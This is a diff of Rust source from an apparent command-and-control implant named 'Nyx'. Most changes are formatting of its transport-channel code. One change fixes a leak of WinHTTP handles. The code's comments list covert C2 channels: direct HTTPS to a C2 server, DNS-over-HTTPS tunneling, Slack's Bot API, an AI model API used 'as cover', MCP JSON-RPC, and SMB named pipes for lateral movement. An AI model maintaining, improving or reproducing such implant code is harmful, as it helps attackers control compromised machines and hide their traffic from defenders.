@@ -19,35 +19,42 @@ use crate::heap::{vec, Vec};
 use crate::resolve::export_addr;
 use core::ffi::c_void;
 
-
 /// Nyx C2 channel type — selects transport protocol.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 #[repr(u8)]
 pub enum Channel {
-    Https      = 0,  // Direct HTTPS POST to C2 server (default)
-    DohDns     = 1,  // DNS-over-HTTPS tunneling
-    SlackApi   = 2,  // Slack Bot API as external C2
-    LlmApi     = 3,  // Anthropic Claude API as cover
-    Mcp        = 4,  // Model Context Protocol JSON-RPC
-    WebTrans   = 5,  // WebTransport over QUIC (future)
-    SmbPipe    = 6,  // SMB Named Pipe (internal lateral)
+    Https = 0,    // Direct HTTPS POST to C2 server (default)
+    DohDns = 1,   // DNS-over-HTTPS tunneling
+    SlackApi = 2, // Slack Bot API as external C2
+    LlmApi = 3,   // Anthropic Claude API as cover
+    Mcp = 4,      // Model Context Protocol JSON-RPC
+    WebTrans = 5, // WebTransport over QUIC (future)
+    SmbPipe = 6,  // SMB Named Pipe (internal lateral)
 }
 
-static CURRENT_CHANNEL: core::sync::atomic::AtomicU8 =
-    core::sync::atomic::AtomicU8::new(0); // default = HTTPS
+static CURRENT_CHANNEL: core::sync::atomic::AtomicU8 = core::sync::atomic::AtomicU8::new(0); // default = HTTPS
 
-pub fn set_channel(ch: Channel) { CURRENT_CHANNEL.store(ch as u8, core::sync::atomic::Ordering::Release); }
+pub fn set_channel(ch: Channel) {
+    CURRENT_CHANNEL.store(ch as u8, core::sync::atomic::Ordering::Release);
+}
 pub fn get_channel() -> Channel {
     match CURRENT_CHANNEL.load(core::sync::atomic::Ordering::Acquire) {
-        0 => Channel::Https, 1 => Channel::DohDns, 2 => Channel::SlackApi,
-        3 => Channel::LlmApi, 4 => Channel::Mcp, 5 => Channel::WebTrans,
+        0 => Channel::Https,
+        1 => Channel::DohDns,
+        2 => Channel::SlackApi,
+        3 => Channel::LlmApi,
+        4 => Channel::Mcp,
+        5 => Channel::WebTrans,
         _ => Channel::SmbPipe,
     }
 }
 
 /// Channel-specific path routing through WinHTTP.
 pub unsafe fn channel_post_frame(
-    host: &[u8], port: u16, body: &[u8], use_tls: bool,
+    host: &[u8],
+    port: u16,
+    body: &[u8],
+    use_tls: bool,
 ) -> Option<Vec<u8>> {
     let ch = get_channel();
     let path: &[u8] = match ch {
@@ -64,9 +71,12 @@ pub unsafe fn channel_post_frame(
 
 pub fn channel_name(ch: Channel) -> &'static str {
     match ch {
-        Channel::Https => "https", Channel::DohDns => "doh-dns",
-        Channel::SlackApi => "slack-api", Channel::LlmApi => "llm-api",
-        Channel::Mcp => "mcp", Channel::WebTrans => "webtransport",
+        Channel::Https => "https",
+        Channel::DohDns => "doh-dns",
+        Channel::SlackApi => "slack-api",
+        Channel::LlmApi => "llm-api",
+        Channel::Mcp => "mcp",
+        Channel::WebTrans => "webtransport",
         Channel::SmbPipe => "smb-pipe",
     }
 }
@@ -407,6 +417,11 @@ pub unsafe fn post_frame(
             // Discard all accumulated data and signal a clean transport error
             // to the caller. Returning partial ciphertext would cause decryption
             // / frame-parse failures rather than a clean retry.
+            // CRITICAL: close all three WinHTTP handles before returning — the
+            // original `return None` here leaked req/conn/session.
+            (fns.close_handle)(req);
+            (fns.close_handle)(conn);
+            (fns.close_handle)(session);
             return None;
         }
         out.extend_from_slice(&chunk[..n]);
